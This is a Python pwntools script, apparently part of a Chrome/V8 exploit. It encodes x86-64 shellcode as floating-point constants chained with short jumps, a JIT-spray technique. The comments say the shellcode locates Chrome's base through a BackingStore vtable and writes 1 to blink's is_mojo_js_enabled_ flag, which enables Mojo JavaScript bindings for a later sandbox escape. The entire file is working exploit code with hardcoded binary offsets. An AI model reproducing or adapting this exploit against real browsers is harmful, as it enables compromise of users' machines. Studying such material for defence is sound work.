#!/usr/bin/env python3
from pwn import *
import struct

context.arch = 'amd64'
jmp = b'\xeb\x0c'

def tod(data):
    assert len(data) == 8
    return struct.unpack('<d', data)[0]

def add_jmp(code):
    assert len(code) <= 6
    print(str(tod(code.ljust(6, b'\x90') + jmp))+",")

def end(code):
    assert len(code) <= 8
    print(tod(code.ljust(8, b'\x90')))

add_jmp(asm("mov eax, [rdi+3]")) # get foo's properties compress pointer
add_jmp(asm("lea rax, [rax+r14]")) # get property address
add_jmp(asm("mov eax, [rax+7]")) # get foo.bar compress pointer
add_jmp(asm("inc rax"))
add_jmp(asm("lea rax, [rax+r14-1]")) # get foo.bar address
add_jmp(asm("mov rbx, [rax+7]")) # get the_heap
add_jmp(asm("mov rbx, [rbx+0x10]")) # get [the_heap+0x10] -> another heap
add_jmp(asm("mov rax, [rbx]"))
# rax is now vtable for std::Cr::__shared_ptr_pointer<v8::internal::BackingStore*, std::Cr::default_delete<v8::internal::BackingStore>, std::Cr::allocator<v8::internal::BackingStore> >+0x10
# nm ./chrome | grep "_ZTVNSt2Cr20__shared_ptr_pointerIPN2v88internal12BackingStoreENS_14default_deleteIS3_EENS_9allocatorIS3_EEEE"
# 000000000d9b63f0 d _ZTVNSt2Cr20__shared_ptr_pointerIPN2v88internal12BackingStoreENS_14default_deleteIS3_EENS_9allocatorIS3_EEEE
# we need to subtract (0xd9b63f0+0x10)
add_jmp(asm("push 0xd9b6400"))
add_jmp(asm("pop rbx ; sub rax, rbx"))
# nm --demangle ./chrome | grep "is_mojo_js_enabled"
# 000000000e3422ec b blink::RuntimeEnabledFeaturesBase::is_mojo_js_enabled_
add_jmp(asm("push 0xe3422ec")) # blink::RuntimeEnabledFeaturesBase::is_mojo_js_enabled_
add_jmp(asm("pop rbx ; add rax, rbx"))
add_jmp(asm("push 0x1 ; pop rbx;"))
end(asm("movb [rax], bl ; ret"))
